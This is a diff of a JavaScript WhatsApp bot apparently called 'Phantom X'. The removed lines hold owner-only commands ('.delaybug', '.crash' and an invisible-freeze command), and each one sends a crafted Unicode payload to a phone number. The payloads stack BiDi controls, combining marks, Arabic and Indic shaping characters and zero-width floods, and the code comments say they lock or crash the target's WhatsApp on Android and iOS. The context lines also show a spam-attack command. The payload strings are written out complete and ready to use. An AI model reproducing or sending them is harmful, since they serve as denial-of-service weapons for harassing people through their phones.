-                    const inv = "\u2062\u2063\u2064\u2061\u00AD\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF";
-                    const bigInv = inv.repeat(2000);
-                    const ifSent = await sock.sendMessage(ifTarget, { text: bigInv });
-                    if (!userCrashKeys[ifTarget]) userCrashKeys[ifTarget] = [];
-                    userCrashKeys[ifTarget].push(ifSent.key);
-                    if (!userBugTypes[ifTarget]) userBugTypes[ifTarget] = [];
-                    if (!userBugTypes[ifTarget].includes("Invisible Freeze")) userBugTypes[ifTarget].push("Invisible Freeze");
-                    await reply(`✅ *Invisible freeze sent to ${ifTarget.split("@")[0]}!*\n\n👁️ Nothing visible delivered — active silently.\n🔧 To undo: *.unbug ${ifTarget.split("@")[0]}*`);
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
             // ─── SPAM ATTACK ───
             // ⚠️ HONEST WARNING: This sends FROM your WhatsApp — risks YOUR account not theirs.
             // Max 5 messages with a delay to reduce ban risk.
@@ -4808,110 +4680,6 @@ _Can be started from any chat, but source members require source group access an
                     }
                     await reply(`✅ Done! Sent ${saTimes} messages to @${saTarget.split("@")[0]}.`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── DELAY BUG ───
-            // Sends ONE single crafted payload that locks the target's WhatsApp sync engine.
-            // The payload combines: deep BiDi nesting + NFC-normalization-heavy combining
-            // sequences + Arabic/Sindhi shaping complexity + zero-width floods.
-            // Effect: WhatsApp's message decryption/sync thread stalls processing the
-            // payload — incoming AND outgoing messages queue up and can't move until
-            // WA finishes (or gives up). Target's WA goes silent: no msgs in, no msgs out.
-            // Usage: .delaybug <number>
-            case ".delaybug":
-            case ".delay": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                const dbTarget = parseBugTarget(parts, msg);
-                if (!dbTarget) return reply(
-                    `⏳ *Delay Bug*\n\n` +
-                    `Usage: *.delaybug <number>*\n` +
-                    `Example: *.delaybug 2348012345678*\n\n` +
-                    `What it does:\n` +
-                    `• Sends ONE crafted sync-lock payload to the target\n` +
-                    `• Their WhatsApp message queue stalls — msgs can't go in or out\n` +
-                    `• No repeated flooding — single silent strike\n` +
-                    `• Use *.unbug <number>* to delete the payload and restore them`
-                );
-                if (isDevProtected(dbTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.`);
-                await reply(`⏳ Sending delay payload to *${dbTarget.split("@")[0]}*...`);
-                try {
-                    // ── Sync-lock payload ──
-                    // Layer 1: Deep BiDi direction stacking — forces repeated resolution passes
-                    const bidiDeep  = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(600);
-                    // Layer 2: NFC normalization busters — A + combining accent sequences WA must normalize
-                    const normBust  = "\u0041\u0301\u0041\u0302\u0041\u0303\u0041\u0304\u0041\u0306\u0041\u0307\u0041\u0308\u0041\u030A".repeat(450);
-                    // Layer 3: Arabic/Sindhi shaping — expensive to resolve glyph joins
-                    const arabShape = "\u0600\u0601\u0602\u0603\u0604\u0605\uFDFD\uFDFC\uFDFB\uFE70\uFE72\uFE74".repeat(380);
-                    // Layer 4: Telugu combining marks — overloads Indic renderer
-                    const telComb   = "\u0C15\u0C4D\u0C37\u0C4D\u0C30\u0C3E\u0C4B\u0C4C".repeat(320);
-                    // Layer 5: Zero-width flood — fills internal text buffer silently
-                    const zwFlood   = "\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF\u00AD\u2062\u2063\u2064".repeat(500);
-                    // Layer 6: Kannada + Tamil stacked — compounds rendering cost
-                    const kanTam    = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(270);
-                    // Assemble the final payload — ordering matters for max queue lock
-                    const delayPayload = bidiDeep + zwFlood + normBust + arabShape + bidiDeep + telComb + kanTam + zwFlood + bidiDeep;
-                    const sent = await sock.sendMessage(dbTarget, { text: delayPayload });
-                    if (!userCrashKeys[dbTarget]) userCrashKeys[dbTarget] = [];
-                    userCrashKeys[dbTarget].push(sent.key);
-                    if (!userBugTypes[dbTarget]) userBugTypes[dbTarget] = [];
-                    if (!userBugTypes[dbTarget].includes("Delay")) userBugTypes[dbTarget].push("Delay");
-                    await reply(
-                        `✅ *Delay payload delivered to ${dbTarget.split("@")[0]}!*\n\n` +
-                        `⏳ Their WhatsApp sync engine is now locked.\n` +
-                        `📵 Incoming and outgoing messages will be stuck/delayed.\n` +
-                        `🔧 To restore them: *.unbug ${dbTarget.split("@")[0]}*`
-                    );
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── CRASH (combined android + iOS + forceclose in one shot) ───
-            case ".crash": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                const crashTarget = parseBugTarget(parts, msg);
-                if (!crashTarget) return reply(
-                    `💥 *Crash*\n\nUsage: *.crash <number>*\nExample: *.crash 2348012345678*\n\n` +
-                    `_Combines Android, iOS, and force-close payloads into one strike._\n` +
-                    `_Maximum crash effect — works on both Android and iPhone._\n` +
-                    `_Use .unbug <number> to undo._`
-                );
-                if (isDevProtected(crashTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`💥 Sending combined crash to *${crashTarget.split("@")[0]}*...`);
-                try {
-                    if (!userCrashKeys[crashTarget]) userCrashKeys[crashTarget] = [];
-                    // Android layer
-                    const tel      = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
-                    const kan      = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(400);
-                    const tam      = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(400);
-                    const zwj      = "\u200D\u200C\u200B".repeat(800);
-                    // iOS layer
-                    const sindhi   = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(600);
-                    const arabPF   = "\uFDFD\uFDFC\uFDFB".repeat(400);
-                    const bidi     = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(500);
-                    const feff     = "\uFEFF".repeat(600);
-                    // Force-close layer
-                    const zwChain  = "\u200D\uFEFF\u200B\u200C\u200E\u200F".repeat(1000);
-                    const rtl      = "\u202E\u202D\u202C\u202B\u202A".repeat(600);
-                    const iso      = "\u2066\u2067\u2068\u2069".repeat(500);
-                    const payload  = tel + zwj + kan + zwj + tam + sindhi + arabPF + bidi + feff + zwChain + rtl + iso + zwj;
-                    const sent = await sock.sendMessage(crashTarget, { text: payload });
-                    userCrashKeys[crashTarget].push(sent.key);
-                    if (!userBugTypes[crashTarget]) userBugTypes[crashTarget] = [];
-                    if (!userBugTypes[crashTarget].includes("Combined Crash")) userBugTypes[crashTarget].push("Combined Crash");
-                    await reply(
-                        `✅ *Crash sent to ${crashTarget.split("@")[0]}!*\n\n` +
-                        `💥 Active on their device.\n` +
-                        `🔧 To undo: *.unbug ${crashTarget.split("@")[0]}*`
-                    );
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── STOP DELAY (legacy — now delaybug uses a single payload stored in userCrashKeys) ───
-            case ".stopdelay": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                await reply(`ℹ️ *.delaybug* now sends a single payload (no interval to stop).\n\nTo remove the delay payload from the target, use:\n*.unbug <number>*`);
                 break;
             }
 
